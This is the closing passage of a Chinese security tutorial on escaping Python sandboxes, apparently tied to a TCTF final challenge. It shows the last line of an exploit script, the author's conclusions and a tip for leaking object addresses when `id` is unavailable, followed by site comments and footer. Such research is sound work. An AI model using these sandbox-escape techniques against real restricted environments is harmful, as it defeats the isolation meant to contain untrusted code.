if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;pwn(id(sys.stdin)&nbsp;+&nbsp;0x20)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">结论</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.Python真的没有沙箱，本文提出的方法几乎适合于任何情况的Python沙箱，除非有大更改。毕竟整个过程中用的都是Python必须的东西，原生的东西，没有依赖不必要的。</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.调试过程中尽量动态去算偏移，除非是真的必须要静态来看出原理。静态看偏移经常会出错。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注意</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.本文的情况和TCTF final的情况不完全一样，他的情况还有一些地方需要处理。比如没有id函数可以拿到任意对象的地址，并且开启了PIE。本文中的情况考虑了PIE，但是id函数需要自己处理一下。我目前想到的id的处理方式，是通过一个方法，比如a = &quot;&quot;; a.ljust.__str__()也是可以达到id函数的效果的，其他类型也可以相应的去找他有的方法来leak出地址。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.本文的情况都是基于debug版本的，release版本应该会有一些小差别，但是方法是通用的，不过由于时间关系我没有再调试一遍release版本，release版本调试起来也会比较费时间，方法是能用的。</span></p><p><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/4059.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】Python沙箱？不存在的 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="4059" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="14811" user-name="大黑阔" href="javascript:;">
                大黑阔            </a>
                        <span class="comment-time">2017-07-04 16:33:31</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14811">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14811" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">分析很到位</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4059" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
